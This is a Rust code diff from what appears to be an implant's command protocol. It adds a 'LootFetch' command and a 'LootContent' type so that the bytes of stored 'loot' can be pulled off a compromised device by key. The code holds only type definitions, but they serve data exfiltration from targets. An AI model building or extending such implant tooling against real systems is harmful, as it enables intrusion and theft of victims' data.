@@ -18,6 +18,11 @@ pub enum Command {
     Cancel { task: TaskId },
     /// Query stored loot.
     Loot(LootQuery),
+    /// Fetch one loot item's bytes by key. Deliberately separate from
+    /// [`Command::Loot`] (which only ever returns metadata) — bulk content
+    /// only leaves the device when a specific key is asked for by name, not
+    /// as a side effect of listing.
+    LootFetch { key: String },
     /// Shut the implant down.
     Shutdown { mode: ShutdownMode },
     // Reserved: offline autonomy ("Mission") is a future additive variant here —
@@ -77,6 +82,17 @@ pub struct LootEntry {
     pub key: String,
     pub kind: LootKind,
     pub size: u64,
+}
+
+/// One loot item's actual bytes, as returned by [`Command::LootFetch`]. JSON
+/// array-of-numbers encoding for now (fine at today's sizes — small JSON
+/// blobs); worth revisiting (e.g. base64) once a module stores something
+/// `Pcap`/`File`-sized.
+#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
+pub struct LootContent {
+    pub key: String,
+    pub kind: LootKind,
+    pub bytes: Vec<u8>,
 }
 
 /// How the implant should shut down.
